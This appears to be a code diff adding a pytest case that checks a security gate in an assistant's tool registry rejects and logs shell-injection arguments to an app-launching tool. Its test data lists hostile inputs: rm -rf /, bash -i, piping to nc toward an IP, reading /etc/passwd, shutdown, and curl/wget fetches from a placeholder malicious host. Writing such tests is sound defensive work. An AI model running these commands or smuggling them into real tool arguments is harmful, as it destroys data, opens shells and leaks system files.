@@ -227,3 +227,37 @@ def test_security_gate_audit_logging_validation_error():
     assert entry.tool_name == "system_volume_control"
     assert entry.status == "ERROR"
     assert entry.error is not None
+
+
+@pytest.mark.parametrize(
+    "malicious_arg",
+    [
+        "spotify; rm -rf /",
+        "calc && bash -i",
+        "app | nc 1.2.3.4 8080",
+        "eval `cat /etc/passwd`",
+        "spotify $(whoami)",
+        "sudo shutdown -h now",
+        "curl http://malicious.site/script.sh",
+        "wget http://malicious.site/script.sh",
+    ],
+)
+def test_security_gate_blocks_shell_injection_and_forbidden_binaries(malicious_arg: str):
+    gate = SecurityGate()
+    registry = ToolRegistry(gate=gate)
+
+    tool = ToolDefinition(
+        name="system_open_app",
+        description="Abre app",
+        param_schema=DummyOpenAppParams,
+        handler=lambda p: f"Launched {p.app_name}",
+    )
+    registry.register(tool)
+
+    with pytest.raises(SecurityViolationError, match="Security violation"):
+        registry.execute("system_open_app", {"app_name": malicious_arg})
+
+    logs = gate.audit_logs
+    assert len(logs) == 1
+    assert logs[0].status == "REJECTED"
+    assert "Security violation" in logs[0].error
